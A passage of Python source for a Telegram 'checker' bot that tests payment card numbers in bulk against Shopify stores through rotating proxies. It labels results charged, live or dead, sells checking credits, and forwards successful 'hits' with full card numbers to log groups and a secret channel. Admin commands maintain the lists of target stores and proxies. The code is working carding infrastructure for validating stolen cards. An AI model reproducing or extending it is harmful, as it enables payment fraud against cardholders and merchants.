                     elapsed, user, plan) -> str:
    """Build the full result card. Returns HTML string (parse_mode='HTML')."""
    ulink = _user_link(user)
    ts    = _fmt_time(elapsed)
    bin_s = _bin_str(bin_data)

    raw_resp = resp or "Unknown"
    rl = raw_resp.lower()

    # Show raw API response directly — same as msh.py
    display_resp_clean = raw_resp

    display_resp_raw = raw_resp.upper() if raw_resp else "UNKNOWN"

    ch_link  = f'<a href="{CHANNEL_LINK}">[❆]</a>'
    live_eid = get_random_live_emoji()

    if verdict == "CHARGED":
        status_line  = (f'<b>{ch_link} HIT CHARGED '
                        f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>')
        gate_line    = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
        resp_te      = f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji>'
        safe_resp    = escape(display_resp_clean)
    elif verdict == "TDS":
        status_line  = (f'<b>{ch_link} HIT LIVE [3DS] '
                        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
        gate_line    = "Gate ➛ Shopify"
        resp_te      = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
        safe_resp    = escape(display_resp_clean)          # real API response
    elif verdict == "LIVE":
        status_line  = (f'<b>{ch_link} HIT LIVE '
                        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
        gate_line    = "Gate ➛ Shopify"
        resp_te      = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
        safe_resp    = escape(display_resp_clean)          # real API response
    else:  # DEAD
        status_line  = (f'<b>{ch_link} DEAD DECLINED '
                        f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>')
        gate_line    = "Gate ➛ Shopify"                  # no price on DEAD
        resp_te      = f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji>'
        safe_resp    = escape(display_resp_clean)

    return (
        f'{status_line}\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
        f'<b>{gate_line}</b>\n'
        f'<b>──────────</b>\n'
        f'<b>{resp_te} Resp ➛ {safe_resp}</b>\n'
        f'<b>Bin ➛ <code>{bin_s}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➛ {ts}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ulink} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {DEV_LINK_HTML} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )


_build_result_msg = build_result_msg


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS UI
# Returns HTML string (parse_mode='HTML') — same approach
# as aiogram mst.py so <tg-emoji> renders animated.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    ts    = _fmt_time(time.time() - sess["start_time"])
    uobj  = sess.get("user_obj")
    ulink = _user_link(uobj) if uobj else "User"
    return (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➛ Shopify</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➛ {sess["checked"]}/{sess["total"]}</b>\n'
        f"<b>──────────</b>\n"
        f'<b><tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji> Charged ➛ {sess["charged"]}</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji> Live    ➛ {sess["approved"]}</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji> Dead    ➛ {sess["dead"]}</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji> Errors  ➛ {sess["errors"]}</b>\n'
        f"<b>──────────</b>\n"
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> Time ➛ {ts}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> {ulink} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji>  |  <tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> {DEV_LINK_HTML}</b>'
    )


def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    sess   = MSH_SESSIONS.get(sid, {})
    live_n = sess.get("approved", 0)
    all_n  = sess.get("checked",  0)
    charged_n = sess.get("charged", 0)
    rows = [[
        _btn(f"Charged ({charged_n})", cb=f"{_CB_RESULT}:{sid}:charged",
             style="danger",   icon=BTN_CHARGED_EMOJI_ID),
        _btn(f"Live ({live_n})",       cb=f"{_CB_RESULT}:{sid}:live",
             style="success",  icon=BTN_LIVE_EMOJI_ID),
        _btn(f"All ({all_n})",         cb=f"{_CB_RESULT}:{sid}:all",
             style="primary",  icon=BTN_ALL_EMOJI_ID),
    ]]
    if running:
        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
                          style="danger", icon=BTN_STOP_EMOJI_ID)])
    return RawMarkup(rows)


async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    now = time.time()
    if not force and (now - sess.get("last_update", 0)) < 1.0:
        return
    text    = _progress_text(sess)          # HTML string — parse_mode="HTML"
    running = sess["status"] == "CHECKING"
    if text == sess.get("last_text") and not force:
        return
    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"], message_id=sess["msg_id"],
            text=text, parse_mode="HTML",
            reply_markup=_msh_buttons(sid, running),
            disable_web_page_preview=True,
        )
        sess["last_text"]   = text
        sess["last_update"] = now
    except Exception:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _make_result_file(sess: dict, kind: str) -> tuple:
    if kind == "charged":
        cards, label = sess.get("charged_cards", []), "Charged"
    elif kind == "live":
        cards, label = sess.get("live_cards", []), "Live"
    elif kind == "dead":
        cards, label = sess.get("dead_cards", []), "Dead"
    else:
        cards = (sess.get("charged_cards", []) + sess.get("live_cards", [])
                 + sess.get("dead_cards",   []) + sess.get("error_cards", []))
        label = "All"

    uname = (sess.get("user_obj") and
             (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
    plan  = sess.get("plan", "TRIAL")

    lines = [
        "Gate ➳ Shopify | 0-5 USD",
        f"Result ➳ {label}", f"Total ➳ {len(cards)}",
        f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "━━━━━━━━━━━━━━",
    ]
    for cd in cards:
        bi    = cd.get("bin_info", {})
        flag  = bi.get("country_emoji", "")
        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
        resp  = cd.get("resp", cd.get("response", "N/A")) or "N/A"
        ver   = cd.get("verdict", "N/A")
        prc   = cd.get("price", "0.00")
        cur   = cd.get("currency", "USD")
        status = ("Charged" if ver == "CHARGED" else
                  "Live"    if ver in ("LIVE","TDS") else
                  "Dead"    if ver == "DEAD" else "Error")
        raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
        lines += [
            f"Card ➳ {cd.get('card','N/A')}",
            f"Status ➳ {status}",
            f"Gate ➳ Shopify | {prc} {cur}",
            f"Resp ➳ {raw_disp}",
            f"Brand ➳ {bi.get('scheme','N/A')}",
            f"Issuer ➳ {bi.get('bank','N/A')}",
            f"Country ➳ {cdisp}",
            "━━━━━━━━━━━━━━",
        ]
    buf   = BytesIO("\n".join(lines).encode("utf-8"))
    buf.seek(0)
    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    return buf, fname, len(cards)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
# Strategy: _send_as_media() sends the sticker as a visible
# ANIMATION with the card as caption — ONE message per
# destination, animated for ALL users (no Premium needed).
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _send_hit(bot, user, text: str, verdict: str,
                    card: str = "", bin_data: dict = None,
                    price: str = "0.00", currency: str = "USD",
                    plan: str = "TRIAL", resp: str = "",
                    skip_dm: bool = False):
    """Send hit notifications to DM, hit-log group, extra charged group, and secret channel.
    `text` = full result card HTML (used as DM caption).
    Each destination gets ONE message: animated sticker + card as caption.
    Set skip_dm=True when the result was already sent to the chat (e.g. from cmd_sh)
    to prevent the same card appearing twice in a private chat."""
    bin_data  = bin_data or {}

    # Only CHARGED cards get DM / hit-log / group notifications.
    # LIVE and TDS are silently collected into the live_cards file — no DM, no log post.
    if verdict in ("LIVE", "TDS"):
        return

    eid   = get_random_charged_emoji()
    ulink = _user_link(user)
    resp_disp = escape(resp) if resp else "ORDER_PAID"

    # Build compact log card — matches the target UI exactly:
    #   HIT ➛ CHARGED 💎
    #   Gate ➛ Shopify • 1.99 USD
    #   💎 ORDER_PAID
    #   User ➛ @username ⭐
    # ── New log style ───────────────────────────────────────────────────────────
    # HIT ➛ CHARGED 💎
    # Gate ➛ Shopify • {price} {currency}
    # 👁 ORDER_PAID
    # User ➛ @username
    # Custom emoji IDs: 6253354142526345892 = 💎 · 6220029508456548253 = 👁
    gate_txt = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"

    uname_display = (
        f"@{user.username}" if getattr(user, "username", None)
        else getattr(user, "first_name", None) or "User"
    )

    plan_eid = _plan_eid(plan)
    log_html = (
        f'<b>HIT ➛ CHARGED '
        f'<tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n'
        f'<b>{gate_txt}</b>\n'
        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji>'
        f' <code>{resp_disp}</code></b>\n'
        f'<b>User ➛ {ulink}'
        f' <tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>'
    )

    log_kb = RawMarkup([[
        _btn("𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", url=BOT_USERNAME_LINK, style="primary",
             icon=CARD_CHK_BTN_EMOJI_ID),
    ]])

    # ── 1. DM — animation + full result card as caption ───────────────────────
    # skip_dm=True when cmd_sh already sent the result to the chat (avoids
    # sending the same card twice when the user is checking in a private chat).
    if not skip_dm:
        try:
            await _send_as_media(bot, user.id, eid, caption=text, parse_mode="HTML")
        except Exception as e:
            logging.warning(f"[HIT] DM uid={user.id}: {e}")

    # ── 2. Hit-log group — compact card with HTML parse_mode (premium emoji) ──
    if HIT_LOG_GROUP_ID:
        try:
            await bot.send_message(
                chat_id=HIT_LOG_GROUP_ID,
                text=log_html,
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=log_kb,
            )
        except Exception as e:
            logging.warning(f"[HIT] log group: {e}")

    # ── 3. Extra charged group — compact card with HTML parse_mode ────────────
    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
        try:
            await asyncio.sleep(0.3)
            await bot.send_message(
                chat_id=EXTRA_CHARGED_GROUP_ID,
                text=log_html,
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=log_kb,
            )
        except Exception as e:
            logging.warning(f"[HIT] extra group: {e}")

    # ── 4. Secret channel — CHARGED only, never LIVE/TDS ─────────────────────
    if SECRET_CHANNEL_ID and verdict == "CHARGED":
        try:
            bin_s  = _bin_str(bin_data)
            sc_lbl = ("CHARGED 💎" if verdict == "CHARGED"
                      else "LIVE [3DS] ✅" if verdict == "TDS" else "LIVE ✅")
            sc_html = (
                f"<b>HIT ➛ {sc_lbl}</b>\n"
                f"<b>{gate_txt}</b>\n"
                f"<b>──────────</b>\n"
                f"<b>💳 <code>{escape(card)}</code></b>\n"
                f"<b>🏦 {bin_s}</b>\n"
                f"<b>──────────</b>\n"
                f"<b>👤 {ulink} ⭐</b>\n"
                f"<b>⚡ {DEV_LINK_HTML}</b>"
            )
            await asyncio.sleep(0.2)
            await _send_as_media(bot, SECRET_CHANNEL_ID, eid,
                                 caption=sc_html, parse_mode="HTML",
                                 disable_notification=True)
        except Exception as e:
            logging.warning(f"[HIT] secret channel: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
                       total, user_obj, plan) -> dict:
    sess = {
        "status":   "CHECKING",
        "chat_id":  chat_id,  "user_id":     user_id,
        "msg_id":   msg_id,   "user_msg_id": user_msg_id,
        "total":    total,    "checked":     0,
        "charged":  0, "approved": 0, "dead": 0, "errors": 0,
        "start_time":    time.time(),
        "charged_cards": [], "live_cards":  [],
        "dead_cards":    [], "error_cards": [], "tds_cards": [],
        "tasks": [], "last_text": "", "last_update": 0,
        "user_obj": user_obj, "plan": plan,
        "plan_eid": _plan_eid(plan),
    }
    MSH_SESSIONS[sid] = sess
    return sess


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECK RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies, bot_data=None):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return

    effective_proxies = proxies if proxies else _ALL_PROXIES
    if not effective_proxies:
        effective_proxies = _load_proxies()

    # Use probed working sites (no dead-site 404s).
    # If probe hasn't run, fall back to full list then probe in background.
    if not all_sites:
        all_sites = get_working_sites()
    elif _WORKING_SITES:
        # Prefer working-site cache over caller-supplied full list
        all_sites = list(_WORKING_SITES)

    logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies "
                 f"{len(valid_cards)} cards concurrency={MAX_CONCURRENT}")
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def worker(card_fmt: str, cc_num: str):
        if sess.get("status") != "CHECKING": return
        async with sem:
            if sess.get("status") != "CHECKING": return
            t0 = time.time()
            # Fresh shuffled site+proxy copy per card for independent rotation
            card_sites   = list(all_sites);  random.shuffle(card_sites)
            card_proxies = list(effective_proxies); random.shuffle(card_proxies)
            try:
                verdict, resp, price, currency = await _check_card_with_retry(
                    None, card_fmt, card_sites, card_proxies,
                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                )
            except asyncio.CancelledError:
                return
            except Exception as e:
                verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"

            elapsed  = time.time() - t0
            raw_resp = resp          # keep real API text — never sanitise before storing
            try:
                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except Exception:
                bin_data = {}

            rec = {
                "card": card_fmt, "verdict": verdict,
                "resp": raw_resp, "response": raw_resp,
                "price": price, "currency": currency, "bin_info": bin_data,
            }
            sess["checked"] += 1

            if verdict == "CHARGED":
                sess["charged"] += 1
                sess["charged_cards"].append(rec)
                # Track lifetime charged count for /me — use bot_data directly
                # (no context available in this background task)
                if bot_data is not None:
                    _ud_store = bot_data.setdefault("user_data", {})
                    _ud_msh   = _ud_store.setdefault(str(user.id), {})
                    _ud_msh["total_charged"] = _ud_msh.get("total_charged", 0) + 1
                    asyncio.create_task(db.save_user_stats_now(user.id, _ud_msh))  # persist total_charged
                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                            price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(
                    bot, user, _dm_html, "CHARGED",
                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                    plan=plan, resp=raw_resp,
                ))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "TDS":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                sess["tds_cards"].append(rec)
                # No DM / hit-log for TDS — user collects via Live file button
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "LIVE":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                # No DM / hit-log for LIVE — user collects via Live file button
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "DEAD":
                sess["dead"] += 1
                sess["dead_cards"].append(rec)

            else:
                sess["errors"] += 1
                sess["error_cards"].append(rec)

            # Update progress after every single card so user sees real-time counts
            asyncio.create_task(_update_progress(bot, sid))

    # Launch ALL card tasks immediately (no stagger) — the per-session semaphore
    # (asyncio.Semaphore(MAX_CONCURRENT) = 25) inside each worker controls how
    # many cards run concurrently FOR THIS USER.  Every user gets their own 25
    # concurrent slots independently — there is no shared global cap here.
    #
    # Tasks are registered into sess["tasks"] immediately so cb_msh_stop can
    # cancel in-flight tasks the instant the Stop button is pressed.
    sess["tasks"] = []
    for cf, cn in valid_cards:
        if sess.get("status") != "CHECKING":
            break
        t = asyncio.create_task(worker(cf, cn))
        sess["tasks"].append(t)

    await asyncio.gather(*sess["tasks"], return_exceptions=True)

    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
        MSH_SESSIONS[sid]["status"] = "FINISHED"
    await _update_progress(bot, sid, force=True)

    logging.info(f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
                 f"D:{sess['dead']} E:{sess['errors']}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 2)
    if len(parts) < 3:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid, kind = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Session expired.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    locked_for = int(BUTTON_LOCK - (time.time() - sess["start_time"]))
    if locked_for > 0:
        await q.answer(f"⏳ Wait {locked_for}s", show_alert=True); return
    buf, fname, count = _make_result_file(sess, kind)
    if count == 0 and kind != "all":
        await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
    await q.answer("📦 Generating file…")
    labels  = {"charged": "Charged 💎", "live": "Live ✅", "all": "All 📁"}
    caption = (f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
               f"<b>Total ➳ {count}</b>\n"
               f"<b>Gate ➳ Shopify Mass</b>")
    try:
        await context.bot.send_document(
            chat_id=q.message.chat_id,
            document=InputFile(buf, filename=fname),
            caption=caption, parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception as e:
        logging.error(f"[MSH] send_document: {e}")
        try:
            buf.seek(0)
            await context.bot.send_document(
                chat_id=q.message.chat_id,
                document=InputFile(buf, filename=fname),
                caption=caption, parse_mode="HTML",
            )
        except Exception:
            pass


async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 1)
    if len(parts) < 2:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Already finished.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    if sess["status"] != "CHECKING":
        await q.answer("ℹ️ Not running.", show_alert=True); return
    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done(): t.cancel()
    await q.answer("🛑 Stopped.")
    sess["last_text"] = ""
    await _update_progress(context.bot, sid, force=True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ud   = _get_ud(user.id, context)

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("🔧 <b>Bot under maintenance.</b>",
                                        parse_mode="HTML"); return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text("❌ <b>Single check disabled.</b>",
                                        parse_mode="HTML"); return

    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        # FIX: use extract_cards() so the card can be anywhere in the replied
        # message text (not just the very first word).
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt:
            _found = extract_cards(txt)
            if _found:
                card = _found[0]
            elif "|" in txt:
                # fallback: first token that contains a pipe
                card = next((t for t in txt.split() if "|" in t), None)

    if not card or "|" not in card:
        await update.message.reply_text(
            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML"); return

    parts = card.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return

    cc, mm, yy, cvv = parts
    if not luhn_check(cc):
        await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
    if is_expired(mm, yy):
        await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return

    premium = _is_premium(ud, user.id)
    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
        cd_map = context.bot_data.setdefault("sh_cd", {})
        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
                parse_mode="HTML"); return
        cd_map[user.id] = time.time()
        ud["credits"]   = max(0, ud.get("credits", 1) - 1)

    plan = ud.get("plan", "TRIAL")

    # ── Spinner (initial "Checking..." message) ───────────────────────────────
    spin = await update.message.reply_text(
        f'<b><tg-emoji emoji-id="{SH_GATE_EMOJI_ID}">❤️</tg-emoji>gate ➳Shopify</b>\n'
        f'<b><tg-emoji emoji-id="{SH_PROG_EMOJI_ID}">😄</tg-emoji>Progress ➳ 0/1</b>\n'
        f'<b>Live ➳ 0 <tg-emoji emoji-id="{SH_LIVE_EMOJI_ID}">🎸</tg-emoji>✅</b>',
        parse_mode="HTML"
    )

    proxies = _load_proxies()

    if not proxies:
        await spin.edit_text(
            "❌ <b>No proxies in px.txt</b>\n\n"
            "Add proxies to <code>px.txt</code> (one ip:port per line).",
            parse_mode="HTML"); return

    # Use probed working sites; fall back to full site list (non-blocking).
    # The background prober keeps _WORKING_SITES updated every 30 min —
    # we never block /sh on a probe to keep single-check responses fast.
    try:
        sites = get_working_sites()
    except RuntimeError:
        await spin.edit_text(
            "❌ <b>No Shopify sites configured.</b>\n\n"
            "Add sites to <code>sites.txt</code> (one domain per line, e.g. <code>store.myshopify.com</code>).\n"
            "Then use /sitechk to verify them.",
            parse_mode="HTML")
        return
    if not sites:
        await spin.edit_text(
            "❌ <b>sites.txt is empty.</b>\n\n"
            "Add at least one Shopify domain to <code>sites.txt</code>.",
            parse_mode="HTML")
        return

    # ── Start checking immediately — no blocking probe wait ──────────────────
    t0 = time.time()
    try:
        (verdict, resp, price, currency), bin_data = await asyncio.gather(
            _check_card_with_retry(None, card, sites, proxies,
                                   max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT),
            _bin_lookup(cc[:6]),
        )
    except Exception as e:
        verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
        bin_data = {}

    elapsed  = time.time() - t0
    res_html = build_result_msg(card, resp, verdict, bin_data,
                                price, currency, elapsed, user, plan)

    # ── Send result as animation+caption (sticker AS photo) ───────────────────
    # _send_as_media() resolves emoji_id → file_id, then:
    #   send_animation(file_id, caption=result_html) → animated clip + card
    # Works for ALL users regardless of Telegram Premium status.
    if verdict == "CHARGED":
        _cmd_eid = get_random_charged_emoji()
        # Track lifetime charged count for /me
        _ud_sh = _get_ud(user.id, context)
        _ud_sh["total_charged"] = _ud_sh.get("total_charged", 0) + 1
        asyncio.create_task(db.save_user_stats_now(user.id, _ud_sh))  # persist total_charged
    elif verdict in ("LIVE", "TDS"):
        _cmd_eid = get_random_live_emoji()
    else:
        _cmd_eid = DECLINED_EMOJI_ID

    kb = RawMarkup([[
        _btn(f"📢 {BOT_NAME}",  url=MY_CHANNEL_LINK,  style="primary"),
        _btn("📋 Hit Logs",     url=LOGS_CHANNEL_LINK, style="primary"),
    ]])

    # Delete the spinner first — then send the result as animation+caption
    try:
        await spin.delete()
    except Exception:
        pass

    # FIX 1: reply to the original command message so result is threaded correctly.
    # FIX 2: skip_dm=True so _send_hit doesn't also send to user.id — that would
    #         produce two identical cards in any private chat.
    await _send_as_media(context.bot, update.effective_chat.id, _cmd_eid,
                         caption=res_html, parse_mode="HTML", reply_markup=kb,
                         reply_to_message_id=update.message.message_id)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        # skip_dm only when checking in a PRIVATE chat (the result is already
        # visible there). In a group the result appears in the group, so the
        # user still needs a personal DM with the full charged card.
        _in_private = (update.effective_chat.id == user.id)
        asyncio.create_task(_send_hit(
            context.bot, user, res_html, verdict,
            card=card, bin_data=bin_data, price=price, currency=currency,
            plan=plan, resp=resp,
            skip_dm=_in_private,
        ))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITECHK  —  admin site management commands (PTB)
#   /sitechk   Audit existing sites.txt (remove dead)
#   /addsite   Upload a file of new sites to verify & add
#   /siteall   Download the current sites.txt
#   /dedupe    Force-deduplicate sites.txt
#   /proxyinfo Show proxy stats (loaded from px.txt)
#   /resetproxy Clear the bad-proxy cache
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import os as _os

# Sitechk-specific emoji IDs (reuse the already-defined constants)
_SC_LIVE_EID      = PROG_LIVE_EMOJI_ID        # ✅
_SC_DEAD_EID      = PROG_DEAD_EMOJI_ID        # ❌
_SC_PROG_EID      = PROG_PROGRESS_EMOJI_ID    # 🔄
_SC_GATE_EID      = PROG_GATE_EMOJI_ID        # 🌐
_SC_ERRORS_EID    = PROG_ERRORS_EMOJI_ID      # ⚠️
_SC_CARD_EID      = CARD_EMOJI_ID             # 💳
_SC_USER_EID      = USER_EMOJI_ID             # 👤
_SC_DEV_EID       = DEV_EMOJI_ID              # ⚡
_SC_PRO_EID       = PRO_EMOJI_ID              # ⭐
_SC_HIT_RESP_EID  = HIT_RESP_EMOJI_ID         # 🔗
_SC_CHARGED_EID   = PROG_CHARGED_EMOJI_ID     # 💎
_SC_REPORT_EID    = "5323674506705785412"     # 📜
_SC_STATS_EID     = "5341715473882955310"     # 📊
_SC_DUPE_EID      = "5801154993188770160"     # 🚫
_SC_DONE_EID      = "5287777298894835685"     # ✨
_SC_DENY_EID      = "4956739572114392015"     # ⛔
_SC_DECLINED_EID  = DECLINED_EMOJI_ID         # 🚫

# Bad-proxy set for sitechk (in-memory, reset on /resetproxy)
_SC_BAD_PROXIES: set = set()

# ── site file helpers ─────────────────────────────────────────────────────

def _sc_read_sites() -> list:
    """Read sites.txt; returns list (no duplicates)."""
    if not _os.path.exists("sites.txt"):
        return []
    with open("sites.txt", "r", encoding="utf-8") as f:
        return list(set(l.strip() for l in f if l.strip()))

def _sc_write_sites(sites_list: list) -> int:
    """Write unique sites to sites.txt. Returns number written."""
    unique = list(set(sites_list))
    with open("sites.txt", "w", encoding="utf-8") as f:
        for s in unique:
            f.write(f"{s}\n")
    return len(unique)

def _sc_normalize_url(url: str) -> str:
    url = url.strip().lower().rstrip("/")
    if url.startswith("www."):
        url = url[4:]
    return url

# ── proxy helpers ─────────────────────────────────────────────────────────

def _sc_get_random_proxy() -> Optional[str]:
    """Pick a random proxy from _ALL_PROXIES, avoiding known bad ones."""
    global _SC_BAD_PROXIES
    px = _ALL_PROXIES or _load_proxies()
    avail = [p for p in px if p not in _SC_BAD_PROXIES]
    if not avail:
        _SC_BAD_PROXIES.clear()
        avail = list(px)
    return random.choice(avail) if avail else None

def _sc_mark_bad(proxy: str):
    if proxy:
        _SC_BAD_PROXIES.add(proxy)

# ── single-site check ─────────────────────────────────────────────────────

async def _sc_check_site(site: str) -> tuple:
    """
    Check one site. Returns (site, status, data_dict, msg_display).
    status = "KEEP" | "REMOVE" | "ERROR"
    """
    MAX_TRIES = 3
    for attempt in range(MAX_TRIES):
        proxy = _sc_get_random_proxy()
        try:
            resp, gw, price_str, currency, http_st = await _call_api(
                PROBE_CARD, site, proxy, timeout=PROBE_TIMEOUT
            )
        except asyncio.CancelledError:
            raise
        except Exception as e:
            _sc_mark_bad(proxy)
            if attempt < MAX_TRIES - 1:
                await asyncio.sleep(0.4)
                continue
            return site, "REMOVE", {"Price": -1.0}, f"Error: {e}"

        resp_up = resp.upper().strip()

        # Proxy/network error → mark bad, retry
        if (http_st is None or "timeout" in resp.lower() or
